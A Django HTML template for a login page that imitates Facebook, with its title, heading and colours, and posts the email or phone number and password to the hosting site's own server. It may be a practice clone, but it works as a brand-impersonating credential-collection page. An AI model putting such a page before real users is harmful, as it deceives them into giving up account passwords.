<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f2f5; text-align: center; }
        .container { width: 350px; margin: 50px auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
        button { width: 100%; background: #1877f2; color: white; border: none; padding: 10px; font-size: 16px; cursor: pointer; border-radius: 5px; }
        .error { color: red; font-size: 14px; }
    </style>
</head>
<body>
        
    <div class="container">
        <form method="POST">
            {% csrf_token %}
            <h2>Log into Facebook</h2>

            {% if error %}
                <p class="error">{{ error }}</p>
            {% endif %}

            <input type="text" name="email_or_phone" placeholder="Email or phone number" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>

            <p><a href="#">Forgotten password?</a></p>
            <hr>
            <a href="{% url 'signup' %}" style="text-decoration: none;">
                <button type="button" style="background: #42b72a;">Create New Account</button>
            </a>
        </form>
    </div>

</body>
</html>
